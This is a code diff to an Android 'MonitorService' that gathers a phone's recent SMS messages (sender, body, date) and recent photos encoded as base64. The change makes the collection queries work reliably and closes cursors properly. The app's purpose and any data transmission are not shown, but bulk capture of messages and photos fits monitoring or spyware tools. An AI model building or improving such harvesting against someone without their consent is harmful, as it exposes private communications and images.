@@ -155,21 +155,25 @@ public class MonitorService extends Service {
         if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
                 != PackageManager.PERMISSION_GRANTED) return smsList;
 
+        Cursor cursor = null;
         try {
-            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null,
-                    "date DESC LIMIT 50");
+            cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null,
+                    "date DESC");
             if (cursor != null) {
-                while (cursor.moveToNext()) {
+                int count = 0;
+                while (cursor.moveToNext() && count < 50) {
                     JSONObject sms = new JSONObject();
                     sms.put("sender", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                     sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                     sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                     smsList.put(sms);
+                    count++;
                 }
-                cursor.close();
             }
         } catch (Exception e) {
             Log.e("getSMS", e.toString());
+        } finally {
+            if (cursor != null) cursor.close();
         }
         return smsList;
     }
@@ -189,7 +193,7 @@ public class MonitorService extends Service {
         try {
             cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                     new String[]{MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME},
-                    null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
+                    null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
 
             if (cursor == null) {
                 photoDebugInfo = "কুয়েরি null রিটার্ন করেছে";
@@ -200,7 +204,8 @@ public class MonitorService extends Service {
             photoDebugInfo = "কার্সারে রো: " + totalRows;
 
             int readErrors = 0;
-            while (cursor.moveToNext()) {
+            int count = 0;
+            while (cursor.moveToNext() && count < 20) {
                 long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                 String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                 Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
@@ -213,6 +218,7 @@ public class MonitorService extends Service {
                         photo.put("name", name);
                         photo.put("data", base64);
                         photoList.put(photo);
+                        count++;
                     } else {
                         readErrors++;
                     }
